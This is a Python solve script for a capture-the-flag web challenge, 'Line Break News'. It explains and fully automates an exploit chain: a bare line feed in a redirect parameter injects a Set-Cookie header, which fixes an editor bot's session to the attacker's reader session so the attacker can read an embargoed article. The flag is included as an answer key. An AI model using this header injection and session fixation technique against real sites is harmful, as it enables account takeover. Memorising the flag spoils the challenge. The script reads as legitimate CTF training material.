#!/usr/bin/env python3
"""
Line Break News - CTF solve script
Flag: ctf7{a_bare_line_feed_fixed_the_editors_session_b201f495}

Vulnerability chain:
1. /go?next=<path> is a redirect "link tracker". The devs block CRLF
   (%0d%0a) and bare CR (%0d) in `next` ("Header injection attempt
   blocked." / 500 on bare CR), but a BARE LINE FEED (%0a alone) is
   never checked. The hand-rolled HTTP server happily treats a lone
   \n as a header separator when building the raw response, so
   `next=/x%0aSet-Cookie:%20<value>;%20Path=/` injects an arbitrary
   extra Set-Cookie header into the 302 response.

2. /tip lets a reader hand the "duty editor" bot an on-site path
   (must start with "/", no spaces/control chars in the raw POST body,
   but %0a survives because it's just a normal URL-encoded byte).
   The bot visits the given path, follows the 302, and then logs in
   to /desk as an editor in whatever session it's holding at the time.

3. Session fixation: submit a tip pointing at
     /go?next=/stories/<slug>%0aSet-Cookie: lbn_session=<OUR_SESSION>; Path=/
   Our own (unauthenticated, reader-level) lbn_session value gets
   written into the bot's cookie jar via the injected Set-Cookie
   header *before* the bot authenticates at /desk. Because the editor
   bot now authenticates while holding our session id, our own browser
   session becomes editor-authenticated too.

4. Simply GET /desk again with our original cookie - it now returns
   the embargoed article containing the flag.

Note: a made-up/garbage session value does NOT work for fixation -
the server validates/looks up the session id server-side, so it must
be a real reader session value we already hold (not a value we invent).
"""
import requests

BASE = "https://l-1e703b334771468e-16303.cf959180.tb7.in"

s = requests.Session()

# Step 1: get a real reader session cookie
r = s.get(f"{BASE}/")
r.raise_for_status()
my_session = s.cookies.get("lbn_session")
print("[*] Our reader session:", my_session)

# Step 2: craft a /go URL that injects a Set-Cookie header via bare LF,
# fixating the bot's future session to our own session id.
injected_path = (
    "/go?next=/stories/semicolon%0a"
    f"Set-Cookie:%20lbn_session={my_session};%20Path=/"
)

# Step 3: submit the tip so the "duty editor" bot visits it and signs in
# to /desk while holding our fixated session.
r = s.post(f"{BASE}/tip", data={"path": injected_path})
r.raise_for_status()
print("[*] Tip response:", r.text.strip().splitlines()[-1] if r.text else r.status_code)
assert "signed in" in r.text, "tip was not accepted / bot did not sign in"

# Step 4: our own session is now editor-authenticated. Read /desk.
r = s.get(f"{BASE}/desk")
r.raise_for_status()
print(r.text)

import re
m = re.search(r"ctf7\{[^}]+\}", r.text)
if m:
    print("\n[+] FLAG:", m.group(0))
else:
    print("\n[-] Flag not found in /desk response, check output above.")
